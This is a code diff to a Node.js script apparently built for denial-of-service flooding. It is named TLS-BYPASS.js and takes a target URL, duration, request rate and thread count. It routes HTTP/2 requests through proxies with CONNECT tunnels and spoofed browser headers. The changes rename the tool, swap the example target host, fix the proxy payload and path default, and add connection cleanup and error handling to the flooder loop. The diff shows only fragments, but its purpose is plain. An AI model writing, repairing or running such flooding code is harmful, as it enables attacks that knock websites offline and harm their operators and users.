@@ -11,7 +11,7 @@ process.setMaxListeners(0);
 require('events').EventEmitter.defaultMaxListeners = 0;
 
 if (process.argv.length < 5) {
-    console.error(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 1000 300 20`);
+    console.error(`Usage: node TLS-BYPASS.js URL TIME REQ_PER_SEC THREADS\nExample: node TLS-BYPASS.js https://graph.vshield.pro 1000 80 10`);
     process.exit(1);
 }
 
@@ -93,7 +93,7 @@ class NetSocket {
 
     HTTP(options, callback) {
         const parsedAddr = options.address.split(':');
-        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
+        const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nConnection: Keep-Alive\r\n\r\n`;
         const buffer = Buffer.from(payload);
 
         const connection = net.connect({
@@ -164,7 +164,7 @@ function randomCharacters(length) {
 
 const headers = {
     ':method': 'GET',
-    ':path': parsedTarget.path,
+    ':path': parsedTarget.path || '/',
     ':scheme': 'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
     'accept-language': 'es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3',
@@ -196,7 +196,7 @@ function runFlooder() {
 
     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) {
-            console.error(error);
+            console.error('Proxy connection error:', error);
             return;
         }
 
@@ -251,4 +251,15 @@ function runFlooder() {
 
             request.on('end', () => {
                 client.close();
-            
+                tlsConn.end();
+                connection.end();
+            });
+        });
+
+        tlsConn.on('error', (err) => {
+            console.error('TLS Connection Error:', err.message);
+            connection.end();
+        });
+    });
+    }
+                
